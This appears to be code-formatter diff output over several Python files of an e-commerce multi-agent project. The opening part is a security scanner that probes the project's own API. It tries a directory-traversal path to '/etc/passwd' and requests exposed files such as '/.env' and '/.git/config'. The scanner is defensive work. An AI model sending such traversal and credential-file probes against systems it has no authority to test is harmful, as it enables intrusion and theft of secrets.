+        test_endpoints = ["/api/v1/inventory", "/api/v1/users"]
+
         for endpoint in test_endpoints:
             for payload in payloads:
                 try:
                     url = f"{self.base_url}{endpoint}"
                     data = {"test": payload, "name": payload}
-                    
+
                     async with self.session.post(url, json=data) as response:
                         response_text = await response.text()
-                        
+
                         # Check if payload is reflected without encoding
                         if payload in response_text and response.status != 400:
                             self._add_vulnerability(
                                 "Insufficient Input Validation",
                                 "HIGH",
                                 f"Malicious input not properly validated: {payload[:50]}",
-                                "Implement comprehensive input validation and sanitization"
+                                "Implement comprehensive input validation and sanitization",
                             )
                             break  # Don't report multiple times for same endpoint
-                
+
                 except Exception as e:
                     logger.debug(f"Input validation test failed: {e}")
-    
+
     async def _check_information_disclosure(self):
         """Check for information disclosure."""
         logger.info("Checking for information disclosure...")
-        
+
         # Test common disclosure endpoints
         disclosure_endpoints = [
-            '/.env',
-            '/config.json',
-            '/package.json',
-            '/composer.json',
-            '/requirements.txt',
-            '/Dockerfile',
-            '/docker-compose.yml',
-            '/.git/config',
-            '/admin',
-            '/debug',
-            '/test',
+            "/.env",
+            "/config.json",
+            "/package.json",
+            "/composer.json",
+            "/requirements.txt",
+            "/Dockerfile",
+            "/docker-compose.yml",
+            "/.git/config",
+            "/admin",
+            "/debug",
+            "/test",
         ]
-        
+
         for endpoint in disclosure_endpoints:
             try:
                 url = f"{self.base_url}{endpoint}"
                 async with self.session.get(url) as response:
                     if response.status == 200:
                         self._add_vulnerability(
                             f"Information Disclosure: {endpoint}",
                             "MEDIUM",
                             f"Sensitive file accessible: {endpoint}",
-                            f"Remove or protect access to {endpoint}"
-                        )
-            
+                            f"Remove or protect access to {endpoint}",
+                        )
+
             except Exception as e:
                 logger.debug(f"Disclosure check for {endpoint} failed: {e}")
-    
+
     async def _check_common_vulnerabilities(self):
         """Check for common web vulnerabilities."""
         logger.info("Checking for common vulnerabilities...")
-        
+
         # Test for directory traversal
         try:
             url = f"{self.base_url}/api/v1/files/../../../etc/passwd"
             async with self.session.get(url) as response:
                 if response.status == 200:
@@ -409,65 +431,73 @@
                     if "root:" in text:
                         self._add_vulnerability(
                             "Directory Traversal",
                             "CRITICAL",
                             "Directory traversal vulnerability detected",
-                            "Implement proper path validation"
+                            "Implement proper path validation",
                         )
         except Exception as e:
             logger.debug(f"Directory traversal check failed: {e}")
-    
+
     async def _check_api_security(self):
         """Check API-specific security."""
         logger.info("Checking API security...")
-        
+
         # Test for API versioning
         try:
             async with self.session.get(f"{self.base_url}/api") as response:
                 if response.status == 200:
                     text = await response.text()
                     if "v1" not in text and "version" not in text.lower():
                         self._add_vulnerability(
                             "API Versioning Missing",
                             "LOW",
                             "API lacks proper versioning",
-                            "Implement API versioning strategy"
+                            "Implement API versioning strategy",
                         )
         except Exception as e:
             logger.debug(f"API versioning check failed: {e}")
-    
-    def _add_vulnerability(self, title: str, severity: str, description: str, recommendation: str):
+
+    def _add_vulnerability(
+        self, title: str, severity: str, description: str, recommendation: str
+    ):
         """Add a vulnerability to the report."""
         vulnerability = {
             "title": title,
             "severity": severity,
             "description": description,
             "recommendation": recommendation,
-            "timestamp": datetime.now().isoformat()
+            "timestamp": datetime.now().isoformat(),
         }
         self.vulnerabilities.append(vulnerability)
-        
+
         if recommendation not in self.recommendations:
             self.recommendations.append(recommendation)
-        
+
         logger.warning(f"Vulnerability found: {title} ({severity})")
-    
-    def _calculate_security_score(self, critical: int, high: int, medium: int, low: int) -> float:
+
+    def _calculate_security_score(
+        self, critical: int, high: int, medium: int, low: int
+    ) -> float:
         """Calculate overall security score (0-100)."""
         # Weighted scoring system
         penalty = (critical * 25) + (high * 10) + (medium * 5) + (low * 2)
         score = max(0, 100 - penalty)
         return round(score, 1)
 
 
-async def run_security_scan(base_url: str, api_key: Optional[str] = None) -> VulnerabilityReport:
+async def run_security_scan(
+    base_url: str, api_key: Optional[str] = None
+) -> VulnerabilityReport:
     """Run a comprehensive security scan."""
     scanner = SecurityScanner(base_url, api_key)
     return await scanner.scan()
 
 
-def generate_security_report(report: VulnerabilityReport, output_file: str = None) -> str:
+def generate_security_report(
+    report: VulnerabilityReport, output_file: str = None
+) -> str:
     """Generate a formatted security report."""
     report_text = f"""
 # FlipSync Security Vulnerability Report
 
 **Scan ID:** {report.scan_id}
@@ -485,25 +515,25 @@
 - **Low Issues:** {report.low_issues}
 - **Info Issues:** {report.info_issues}
 
 ## Vulnerabilities
 """
-    
+
     for vuln in report.vulnerabilities:
         report_text += f"""
 ### {vuln['title']} ({vuln['severity']})
 **Description:** {vuln['description']}
 **Recommendation:** {vuln['recommendation']}
 """
-    
+
     report_text += f"""
 ## Recommendations
 """
     for i, rec in enumerate(report.recommendations, 1):
         report_text += f"{i}. {rec}\n"
-    
+
     if output_file:
-        with open(output_file, 'w') as f:
+        with open(output_file, "w") as f:
             f.write(report_text)
         logger.info(f"Security report saved to {output_file}")
-    
+
     return report_text
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/vulnerability_scanner.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/utils/test_config.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/utils/test_config.py	2025-06-19 04:03:58.674488+00:00
@@ -3,13 +3,17 @@
 import unittest
 from typing import Dict, Any
 
 import sys
 import os
-sys.path.append('/root/venvs/Flipsync-1/.Flipsync')
+
+sys.path.append("/root/venvs/Flipsync-1/.Flipsync")
 from fs_agt_clean.core.utils.config import (
-    Settings, get_settings, get_settings_with_mobile_context, get_settings_for_agent
+    Settings,
+    get_settings,
+    get_settings_with_mobile_context,
+    get_settings_for_agent,
 )
 
 
 class TestSettings(unittest.TestCase):
     """Test cases for the Settings class."""
@@ -203,11 +207,11 @@
         self.assertTrue(personalized["personalized"])
 
         # Test generate_recommendations
         user_data = {
             "recent_searches": ["laptop", "smartphone", "headphones"],
-            "purchase_history": ["laptop"]
+            "purchase_history": ["laptop"],
         }
         recommendations = settings.generate_recommendations(user_data)
         self.assertEqual(len(recommendations), 2)
         self.assertEqual(recommendations[0]["type"], "search_based")
 
@@ -217,11 +221,13 @@
 
         settings.conversational.query_routing_enabled = False
         self.assertEqual(settings.route_query(query, context)["handler"], "default")
 
         settings.conversational.personalization_enabled = False
-        self.assertEqual(settings.personalize_response(response, user_profile), response)
+        self.assertEqual(
+            settings.personalize_response(response, user_profile), response
+        )
 
         settings.conversational.proactive_recommendations_enabled = False
         self.assertEqual(settings.generate_recommendations(user_data), [])
 
     def test_technical_implementation_methods(self):
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/utils/test_config.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/webhooks/monitor.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/webhooks/monitor.py	2025-06-19 04:03:58.869620+00:00
@@ -106,11 +106,13 @@
                 """
             )
 
             if not table_check:
                 # Create webhook_delivery_logs table in public schema (fallback)
-                self.logger.info("Creating webhook_delivery_logs table in public schema")
+                self.logger.info(
+                    "Creating webhook_delivery_logs table in public schema"
+                )
                 await self.database.execute(
                     """
                     CREATE TABLE public.webhook_delivery_logs (
                         id SERIAL PRIMARY KEY,
                         webhook_id INTEGER NOT NULL,
@@ -206,12 +208,16 @@
                     """,
                     {"last_check": last_check},
                 )
 
                 if successful_deliveries_result:
-                    successful_deliveries["count"] = successful_deliveries_result.get("count", 0) or 0
-                    successful_deliveries["avg_time"] = successful_deliveries_result.get("avg_time", 0) or 0
+                    successful_deliveries["count"] = (
+                        successful_deliveries_result.get("count", 0) or 0
+                    )
+                    successful_deliveries["avg_time"] = (
+                        successful_deliveries_result.get("avg_time", 0) or 0
+                    )
 
             except Exception as e:
                 # If table doesn't exist, just log debug message and continue with defaults
                 if "does not exist" in str(e).lower() or "relation" in str(e).lower():
                     self.logger.debug(f"Webhook delivery logs table not available: {e}")
@@ -228,11 +234,13 @@
                     """,
                     {"last_check": last_check},
                 )
 
                 if failed_deliveries_result:
-                    failed_deliveries["count"] = failed_deliveries_result.get("count", 0) or 0
+                    failed_deliveries["count"] = (
+                        failed_deliveries_result.get("count", 0) or 0
+                    )
 
             except Exception as e:
                 # If table doesn't exist, just log debug message and continue with defaults
                 if "does not exist" in str(e).lower() or "relation" in str(e).lower():
                     self.logger.debug(f"Webhook delivery logs table not available: {e}")
@@ -308,31 +316,37 @@
 
     async def _cleanup_old_stats(self) -> None:
         """Clean up old statistics."""
         try:
             # Clean up old delivery logs
-            cutoff_date = datetime.now(timezone.utc) - timedelta(days=self.stats_retention_days)
+            cutoff_date = datetime.now(timezone.utc) - timedelta(
+                days=self.stats_retention_days
+            )
 
             try:
                 await self.database.execute(
                     "DELETE FROM public.webhook_delivery_logs WHERE timestamp < :cutoff_date",
-                    {"cutoff_date": cutoff_date}
+                    {"cutoff_date": cutoff_date},
                 )
             except Exception as e:
                 if "does not exist" in str(e).lower() or "relation" in str(e).lower():
-                    self.logger.debug(f"Webhook delivery logs table not available for cleanup: {e}")
+                    self.logger.debug(
+                        f"Webhook delivery logs table not available for cleanup: {e}"
+                    )
                 else:
                     self.logger.error(f"Error cleaning up webhook delivery logs: {e}")
 
             try:
                 await self.database.execute(
                     "DELETE FROM public.webhook_retry_logs WHERE timestamp < :cutoff_date",
-                    {"cutoff_date": cutoff_date}
+                    {"cutoff_date": cutoff_date},
                 )
             except Exception as e:
                 if "does not exist" in str(e).lower() or "relation" in str(e).lower():
-                    self.logger.debug(f"Webhook retry logs table not available for cleanup: {e}")
+                    self.logger.debug(
+                        f"Webhook retry logs table not available for cleanup: {e}"
+                    )
                 else:
                     self.logger.error(f"Error cleaning up webhook retry logs: {e}")
 
         except Exception as e:
             self.logger.error(f"Error in webhook stats cleanup: {e}")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/webhooks/monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/utils/config.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/utils/config.py	2025-06-19 04:03:58.875521+00:00
@@ -91,11 +91,13 @@
     INFLUXDB_ORG: str = "my-org"
     INFLUXDB_BUCKET: str = "my-bucket"
 
     # Vision-aligned settings
     mobile: MobileConfig = Field(default_factory=MobileConfig)
-    agent_coordination: AgentCoordinationConfig = Field(default_factory=AgentCoordinationConfig)
+    agent_coordination: AgentCoordinationConfig = Field(
+        default_factory=AgentCoordinationConfig
+    )
     conversational: ConversationalConfig = Field(default_factory=ConversationalConfig)
     security: SecurityConfig = Field(default_factory=SecurityConfig)
 
     # State management
     state_persistence_enabled: bool = True
@@ -159,16 +161,13 @@
             # Queue operation for when online
             return {
                 "status": "queued",
                 "message": "Operation queued for when online",
                 "operation": operation,
-                "data": data
+                "data": data,
             }
-        return {
-            "status": "online",
-            "message": "Operation can proceed online"
-        }
+        return {"status": "online", "message": "Operation can proceed online"}
 
     def save_local_state(self, state: Dict[str, Any]) -> bool:
         """Save state locally for offline use."""
         if self.is_mobile_context() and self.mobile.offline_mode_enabled:
             # In a real implementation, this would save to local storage
@@ -184,14 +183,11 @@
 
     def format_for_mobile_ui(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Format data for mobile UI."""
         if self.is_mobile_context() and self.mobile.ui_optimization_enabled:
             # Optimize data structure for mobile UI
-            return {
-                "mobile_optimized": True,
-                "data": self.optimize_payload(data)
-            }
+            return {"mobile_optimized": True, "data": self.optimize_payload(data)}
         return data
 
     # Agent Coordination Methods
 
     def get_agent_hierarchy(self) -> Dict[str, List[str]]:
@@ -202,11 +198,11 @@
         # In a real implementation, this would load from configuration
         return {
             "executive": ["market", "content", "logistics"],
             "market": ["amazon", "ebay", "inventory"],
             "content": ["description", "image", "seo"],
-            "logistics": ["shipping", "tracking", "returns"]
+            "logistics": ["shipping", "tracking", "returns"],
         }
 
     def get_orchestration_config(self) -> Dict[str, Any]:
         """Get orchestration configuration."""
         if not self.agent_coordination.orchestration_enabled:
@@ -214,11 +210,11 @@
 
         return {
             "registry_url": self.agent_coordination.agent_registry_url,
             "protocol": self.agent_coordination.coordination_protocol,
             "message_format": self.agent_coordination.message_format,
-            "correlation_enabled": self.agent_coordination.correlation_id_enabled
+            "correlation_enabled": self.agent_coordination.correlation_id_enabled,
         }
 
     def get_decision_engine_config(self) -> Dict[str, Any]:
         """Get decision engine configuration."""
         if not self.agent_coordination.decision_engine_enabled:
@@ -226,11 +222,11 @@
 
         return {
             "strategy": "hierarchical",
             "fallback_strategy": "majority_vote",
             "priority_levels": self.agent_coordination.priority_levels,
-            "timeout_ms": 5000
+            "timeout_ms": 5000,
         }
 
     def get_pipeline_config(self) -> Dict[str, Any]:
         """Get pipeline controller configuration."""
         if not self.agent_coordination.pipeline_enabled:
@@ -238,11 +234,11 @@
 
         return {
             "max_parallel_tasks": 5,
             "max_pipeline_depth": 10,
             "timeout_ms": 30000,
-            "retry_count": 3
+            "retry_count": 3,
         }
 
     # Conversational Interface Methods
 
     def format_for_nlp(self, data: Dict[str, Any]) -> Dict[str, Any]:
@@ -259,11 +255,11 @@
                 nlp_data[key] = value["text"]
 
         return {
             "original": data,
             "nlp_data": nlp_data,
-            "language": self.conversational.default_language
+            "language": self.conversational.default_language,
         }
 
     def route_query(self, query: str, context: Dict[str, Any]) -> Dict[str, Any]:
         """Route a query to the appropriate handler."""
         if not self.conversational.query_routing_enabled:
@@ -277,53 +273,65 @@
         elif "product" in query or "item" in query:
             return {"handler": "product", "query": query, "context": context}
         else:
             return {"handler": "general", "query": query, "context": context}
 
-    def personalize_response(self, response: Dict[str, Any], user_profile: Dict[str, Any]) -> Dict[str, Any]:
+    def personalize_response(
+        self, response: Dict[str, Any], user_profile: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Personalize a response based on user profile."""
         if not self.conversational.personalization_enabled or not user_profile:
             return response
 
         # Add personalization
         if "name" in user_profile:
             if "message" in response:
-                response["message"] = f"Hi {user_profile['name']}, {response['message']}"
+                response["message"] = (
+                    f"Hi {user_profile['name']}, {response['message']}"
+                )
 
         if "preferences" in user_profile:
             response["personalized"] = True
             response["user_preferences"] = user_profile["preferences"]
 
         return response
 
-    def generate_recommendations(self, user_data: Dict[str, Any]) -> List[Dict[str, Any]]:
+    def generate_recommendations(
+        self, user_data: Dict[str, Any]
+    ) -> List[Dict[str, Any]]:
         """Generate proactive recommendations based on user data."""
         if not self.conversational.proactive_recommendations_enabled:
             return []
 
         # Simple recommendation logic
         recommendations = []
 
         if "recent_searches" in user_data:
-            recommendations.append({
-                "type": "search_based",
-                "message": "Based on your recent searches, you might be interested in:",
-                "items": user_data["recent_searches"][:3]
-            })
+            recommendations.append(
+                {
+                    "type": "search_based",
+                    "message": "Based on your recent searches, you might be interested in:",
+                    "items": user_data["recent_searches"][:3],
+                }
+            )
 
         if "purchase_history" in user_data:
-            recommendations.append({
-                "type": "purchase_based",
-                "message": "Customers who bought similar items also bought:",
-                "items": ["Related item 1", "Related item 2"]
-            })
+            recommendations.append(
+                {
+                    "type": "purchase_based",
+                    "message": "Customers who bought similar items also bought:",
+                    "items": ["Related item 1", "Related item 2"],
+                }
+            )
 
         return recommendations
 
     # Technical Implementation Methods
 
-    def format_message(self, message_type: str, payload: Dict[str, Any], priority: str = "medium") -> Dict[str, Any]:
+    def format_message(
+        self, message_type: str, payload: Dict[str, Any], priority: str = "medium"
+    ) -> Dict[str, Any]:
         """Format a message according to the standard protocol."""
         if not self.agent_coordination.correlation_id_enabled:
             return payload
 
         import uuid
@@ -333,20 +341,22 @@
             "message_id": str(uuid.uuid4()),
             "correlation_id": payload.get("correlation_id", str(uuid.uuid4())),
             "timestamp": int(time.time()),
             "message_type": message_type,
             "priority": priority,
-            "payload": payload
+            "payload": payload,
         }
 
     def persist_state(self, state_key: str, state_data: Dict[str, Any]) -> bool:
         """Persist state data."""
         if not self.state_persistence_enabled:
             return False
 
         # In a real implementation, this would save to the configured state store
-        logging.info(f"Persisting state for {state_key}: {json.dumps(state_data)[:100]}...")
+        logging.info(
+            f"Persisting state for {state_key}: {json.dumps(state_data)[:100]}..."
+        )
         return True
 
     def retrieve_state(self, state_key: str) -> Dict[str, Any]:
         """Retrieve persisted state data."""
         if not self.state_persistence_enabled:
@@ -363,11 +373,11 @@
 
         # In a real implementation, this would encrypt sensitive data
         return {
             "encrypted": True,
             "algorithm": self.security.encryption_algorithm,
-            "data": f"<encrypted_{len(str(data))}_bytes>"
+            "data": f"<encrypted_{len(str(data))}_bytes>",
         }
 
     def track_performance(self, operation: str, duration_ms: float) -> None:
         """Track performance metrics for an operation."""
         if not self.performance_metrics_enabled:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/utils/config.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/workflow_intent_detector.py	2025-06-16 23:14:30.936416+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/workflow_intent_detector.py	2025-06-19 04:03:59.028396+00:00
@@ -15,25 +15,26 @@
 
 
 @dataclass
 class WorkflowIntent:
     """Represents a detected workflow intent."""
+
     workflow_type: str
     confidence: float
     participating_agents: List[str]
     context: Dict[str, Any]
     trigger_phrases: List[str]
 
 
 class WorkflowIntentDetector:
     """Detects workflow intents from user messages."""
-    
+
     def __init__(self):
         """Initialize the workflow intent detector."""
         self.workflow_patterns = self._initialize_workflow_patterns()
         logger.info("Workflow Intent Detector initialized")
-    
+
     def _initialize_workflow_patterns(self) -> Dict[str, Dict[str, Any]]:
         """Initialize workflow detection patterns."""
         return {
             # Product Analysis Workflow
             "product_analysis": {
@@ -45,26 +46,32 @@
                     r"review.*product",
                     r"what.*think.*product",
                     r"should.*sell.*this",
                     r"is.*this.*good.*sell",
                     r"worth.*selling",
-                    r"profitable.*product"
-                ],
-                "keywords": [
-                    "analyze product", "product analysis", "evaluate item",
-                    "assess product", "review product", "product review",
-                    "should I sell", "worth selling", "profitable",
-                    "market potential", "product evaluation"
+                    r"profitable.*product",
+                ],
+                "keywords": [
+                    "analyze product",
+                    "product analysis",
+                    "evaluate item",
+                    "assess product",
+                    "review product",
+                    "product review",
+                    "should I sell",
+                    "worth selling",
+                    "profitable",
+                    "market potential",
+                    "product evaluation",
                 ],
                 "participating_agents": ["content", "market", "executive"],
                 "context_extractors": {
                     "product_name": r"(?:product|item|this)\s+(?:is\s+)?([^.!?]+)",
                     "marketplace": r"(?:on|for)\s+(ebay|amazon|etsy|walmart)",
-                    "price_mentioned": r"\$?(\d+(?:\.\d{2})?)"
-                }
-            },
-            
+                    "price_mentioned": r"\$?(\d+(?:\.\d{2})?)",
+                },
+            },
             # Listing Optimization Workflow
             "listing_optimization": {
                 "patterns": [
                     r"optimize.*listing",
                     r"improve.*listing",
@@ -73,26 +80,33 @@
                     r"seo.*listing",
                     r"listing.*seo",
                     r"improve.*title",
                     r"better.*description",
                     r"optimize.*keywords",
-                    r"listing.*performance"
-                ],
-                "keywords": [
-                    "optimize listing", "improve listing", "better listing",
-                    "listing optimization", "seo listing", "listing seo",
-                    "improve title", "better description", "optimize keywords",
-                    "listing performance", "boost visibility", "increase sales"
+                    r"listing.*performance",
+                ],
+                "keywords": [
+                    "optimize listing",
+                    "improve listing",
+                    "better listing",
+                    "listing optimization",
+                    "seo listing",
+                    "listing seo",
+                    "improve title",
+                    "better description",
+                    "optimize keywords",
+                    "listing performance",
+                    "boost visibility",
+                    "increase sales",
                 ],
                 "participating_agents": ["content", "market", "executive"],
                 "context_extractors": {
                     "listing_url": r"(?:https?://)?(?:www\.)?(?:ebay|amazon|etsy)\.com/[^\s]+",
                     "marketplace": r"(?:on|for)\s+(ebay|amazon|etsy|walmart)",
-                    "optimization_type": r"(seo|keywords|title|description|images|pricing)"
-                }
-            },
-            
+                    "optimization_type": r"(seo|keywords|title|description|images|pricing)",
+                },
+            },
             # Decision Consensus Workflow
             "decision_consensus": {
                 "patterns": [
                     r"should.*I.*(?:buy|sell|list|price)",
                     r"what.*do.*you.*think",
@@ -101,26 +115,33 @@
                     r"decision.*help",
                     r"recommend.*strategy",
                     r"best.*approach",
                     r"what.*would.*you.*do",
                     r"consensus.*on",
-                    r"team.*opinion"
-                ],
-                "keywords": [
-                    "should I", "what do you think", "need advice",
-                    "help decide", "decision help", "recommend strategy",
-                    "best approach", "what would you do", "consensus",
-                    "team opinion", "multiple perspectives", "agent input"
+                    r"team.*opinion",
+                ],
+                "keywords": [
+                    "should I",
+                    "what do you think",
+                    "need advice",
+                    "help decide",
+                    "decision help",
+                    "recommend strategy",
+                    "best approach",
+                    "what would you do",
+                    "consensus",
+                    "team opinion",
+                    "multiple perspectives",
+                    "agent input",
                 ],
                 "participating_agents": ["executive", "content", "market"],
                 "context_extractors": {
                     "decision_type": r"should.*I\s+(buy|sell|list|price|invest|expand)",
                     "product_mentioned": r"(?:this|the)\s+([^.!?]+)",
-                    "budget_mentioned": r"budget.*\$?(\d+(?:,\d{3})*(?:\.\d{2})?)"
-                }
-            },
-            
+                    "budget_mentioned": r"budget.*\$?(\d+(?:,\d{3})*(?:\.\d{2})?)",
+                },
+            },
             # Pricing Strategy Workflow
             "pricing_strategy": {
                 "patterns": [
                     r"pricing.*strategy",
                     r"price.*analysis",
@@ -129,26 +150,33 @@
                     r"pricing.*help",
                     r"what.*price",
                     r"how.*much.*charge",
                     r"pricing.*advice",
                     r"market.*pricing",
-                    r"price.*research"
-                ],
-                "keywords": [
-                    "pricing strategy", "price analysis", "competitive pricing",
-                    "price optimization", "pricing help", "what price",
-                    "how much charge", "pricing advice", "market pricing",
-                    "price research", "pricing model", "dynamic pricing"
+                    r"price.*research",
+                ],
+                "keywords": [
+                    "pricing strategy",
+                    "price analysis",
+                    "competitive pricing",
+                    "price optimization",
+                    "pricing help",
+                    "what price",
+                    "how much charge",
+                    "pricing advice",
+                    "market pricing",
+                    "price research",
+                    "pricing model",
+                    "dynamic pricing",
                 ],
                 "participating_agents": ["market", "content", "executive"],
                 "context_extractors": {
                     "product_category": r"(?:category|type):\s*([^.!?]+)",
                     "current_price": r"currently.*\$?(\d+(?:\.\d{2})?)",
-                    "target_margin": r"margin.*(\d+)%"
-                }
-            },
-            
+                    "target_margin": r"margin.*(\d+)%",
+                },
+            },
             # Market Research Workflow
             "market_research": {
                 "patterns": [
                     r"market.*research",
                     r"market.*analysis",
@@ -157,123 +185,140 @@
                     r"research.*market",
                     r"market.*insights",
                     r"competitive.*landscape",
                     r"market.*opportunity",
                     r"demand.*analysis",
-                    r"market.*study"
-                ],
-                "keywords": [
-                    "market research", "market analysis", "competitor analysis",
-                    "market trends", "research market", "market insights",
-                    "competitive landscape", "market opportunity", "demand analysis",
-                    "market study", "market intelligence", "trend analysis"
-                ],
-                "participating_agents": ["market", "competitor_analyzer", "trend_detector", "executive"],
+                    r"market.*study",
+                ],
+                "keywords": [
+                    "market research",
+                    "market analysis",
+                    "competitor analysis",
+                    "market trends",
+                    "research market",
+                    "market insights",
+                    "competitive landscape",
+                    "market opportunity",
+                    "demand analysis",
+                    "market study",
+                    "market intelligence",
+                    "trend analysis",
+                ],
+                "participating_agents": [
+                    "market",
+                    "competitor_analyzer",
+                    "trend_detector",
+                    "executive",
+                ],
                 "context_extractors": {
                     "product_category": r"(?:for|in)\s+([^.!?]+)\s+(?:market|category)",
                     "timeframe": r"(?:next|past|last)\s+(\d+)\s+(days?|weeks?|months?|years?)",
-                    "geographic_focus": r"(?:in|for)\s+(US|USA|UK|Canada|Europe|global)"
-                }
-            }
+                    "geographic_focus": r"(?:in|for)\s+(US|USA|UK|Canada|Europe|global)",
+                },
+            },
         }
-    
+
     def detect_workflow_intent(self, message: str) -> Optional[WorkflowIntent]:
         """
         Detect if a message should trigger a workflow.
-        
+
         Args:
             message: User message to analyze
-            
+
         Returns:
             WorkflowIntent if a workflow should be triggered, None otherwise
         """
         message_lower = message.lower().strip()
-        
+
         # Score each workflow type
         workflow_scores = {}
-        
+
         for workflow_type, config in self.workflow_patterns.items():
             score = self._calculate_workflow_score(message_lower, config)
             if score > 0:
                 workflow_scores[workflow_type] = score
-        
+
         # If no workflows scored, return None
         if not workflow_scores:
             return None
-        
+
         # Find the best matching workflow
         best_workflow = max(workflow_scores.keys(), key=lambda k: workflow_scores[k])
         best_score = workflow_scores[best_workflow]
-        
+
         # Require minimum confidence threshold
         confidence = min(best_score / 10.0, 1.0)  # Normalize to 0-1
         if confidence < 0.3:  # 30% minimum confidence
             return None
-        
+
         # Extract context for the workflow
         config = self.workflow_patterns[best_workflow]
         context = self._extract_context(message, config.get("context_extractors", {}))
-        
+
         # Find trigger phrases that matched
         trigger_phrases = self._find_trigger_phrases(message_lower, config)
-        
-        logger.info(f"Detected workflow intent: {best_workflow} (confidence: {confidence:.2f})")
-        
+
+        logger.info(
+            f"Detected workflow intent: {best_workflow} (confidence: {confidence:.2f})"
+        )
+
         return WorkflowIntent(
             workflow_type=best_workflow,
             confidence=confidence,
             participating_agents=config["participating_agents"],
             context=context,
-            trigger_phrases=trigger_phrases
+            trigger_phrases=trigger_phrases,
         )
-    
+
     def _calculate_workflow_score(self, message: str, config: Dict[str, Any]) -> float:
         """Calculate score for a workflow based on pattern and keyword matches."""
         score = 0.0
-        
+
         # Check regex patterns (higher weight)
         for pattern in config.get("patterns", []):
             if re.search(pattern, message, re.IGNORECASE):
                 score += 3.0
-        
+
         # Check keyword matches (lower weight)
         for keyword in config.get("keywords", []):
             if keyword.lower() in message:
                 score += 1.0
-        
+
         return score
-    
-    def _extract_context(self, message: str, extractors: Dict[str, str]) -> Dict[str, Any]:
+
+    def _extract_context(
+        self, message: str, extractors: Dict[str, str]
+    ) -> Dict[str, Any]:
         """Extract context information from the message using regex extractors."""
         context = {}
-        
+
         for key, pattern in extractors.items():
             match = re.search(pattern, message, re.IGNORECASE)
             if match:
                 context[key] = match.group(1).strip()
-        
+
         # Add the original message for reference
         context["original_message"] = message
         context["message_length"] = len(message)
-        
+
         return context
-    
+
     def _find_trigger_phrases(self, message: str, config: Dict[str, Any]) -> List[str]:
         """Find which trigger phrases matched in the message."""
         trigger_phrases = []
-        
+
         # Check keywords that matched
         for keyword in config.get("keywords", []):
             if keyword.lower() in message:
                 trigger_phrases.append(keyword)
-        
+
         # Check patterns that matched (extract the actual matched text)
         for pattern in config.get("patterns", []):
             match = re.search(pattern, message, re.IGNORECASE)
             if match:
                 trigger_phrases.append(match.group(0))
-        
+
         return trigger_phrases
 
     def get_supported_workflows(self) -> List[str]:
         """Get list of supported workflow types."""
         return list(self.workflow_patterns.keys())
@@ -287,18 +332,20 @@
         descriptions = {
             "product_analysis": "Comprehensive analysis of products for selling potential, market fit, and profitability",
             "listing_optimization": "Optimization of product listings for better visibility, SEO, and conversion rates",
             "decision_consensus": "Multi-agent consensus building for important business decisions",
             "pricing_strategy": "Strategic pricing analysis and optimization recommendations",
-            "market_research": "In-depth market research and competitive analysis"
+            "market_research": "In-depth market research and competitive analysis",
         }
 
         return {
             "workflow_type": workflow_type,
             "participating_agents": config["participating_agents"],
             "example_keywords": config["keywords"][:5],  # First 5 keywords as examples
-            "description": descriptions.get(workflow_type, f"Workflow for {workflow_type}")
+            "description": descriptions.get(
+                workflow_type, f"Workflow for {workflow_type}"
+            ),
         }
 
 
 # Global detector instance
 workflow_intent_detector = WorkflowIntentDetector()
--- /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/agent_integration.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/agent_integration.py	2025-06-19 04:03:59.025651+00:00
@@ -12,199 +12,206 @@
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any
 
 from fs_agt_clean.core.websocket.manager import websocket_manager
 from fs_agt_clean.core.websocket.events import (
-    EventType, AgentType, SenderType,
-    create_message_event, create_typing_event, create_agent_status_event,
-    create_system_alert_event
+    EventType,
+    AgentType,
+    SenderType,
+    create_message_event,
+    create_typing_event,
+    create_agent_status_event,
+    create_system_alert_event,
 )
 from fs_agt_clean.agents.base_conversational_agent import AgentResponse
 from fs_agt_clean.services.approval import ApprovalIntegrationService
 
 logger = logging.getLogger(__name__)
 
 
 class ConversationalAgentWebSocketIntegration:
     """
     Integrates conversational agents with WebSocket for real-time communication.
-    
+
     Features:
     - Real-time agent response streaming
     - Approval workflow notifications
     - Agent status broadcasting
     - Performance monitoring (<100ms latency)
     """
-    
+
     def __init__(self, approval_service: Optional[ApprovalIntegrationService] = None):
         """Initialize the WebSocket integration service."""
         self.approval_service = approval_service or ApprovalIntegrationService()
-        
+
         # Performance tracking
         self.response_times = []
         self.max_response_time = 0.1  # 100ms target
-        
+
         # Agent type mapping
         self.agent_type_mapping = {
             "content": AgentType.CONTENT,
             "logistics": AgentType.LOGISTICS,
             "executive": AgentType.EXECUTIVE,
             "market": AgentType.MARKET,
-            "assistant": AgentType.ASSISTANT
+            "assistant": AgentType.ASSISTANT,
         }
-        
+
         logger.info("Conversational Agent WebSocket Integration initialized")
-    
+
     async def stream_agent_response(
         self,
         agent_response: AgentResponse,
         conversation_id: str,
         user_id: str,
         original_message: str,
-        stream_chunks: bool = True
+        stream_chunks: bool = True,
     ) -> Dict[str, Any]:
         """
         Stream agent response through WebSocket with real-time updates.
-        
+
         Args:
             agent_response: The agent response to stream
             conversation_id: Target conversation ID
             user_id: User who initiated the request
             original_message: Original user message
             stream_chunks: Whether to stream response in chunks
-            
+
         Returns:
             Dictionary with streaming results and approval info
         """
         start_time = time.time()
-        
+
         try:
             # Get agent type for WebSocket events
             ws_agent_type = self.agent_type_mapping.get(
-                agent_response.agent_type, 
-                AgentType.ASSISTANT
-            )
-            
+                agent_response.agent_type, AgentType.ASSISTANT
+            )
+
             # Send typing indicator
             await self._send_typing_indicator(conversation_id, ws_agent_type, True)
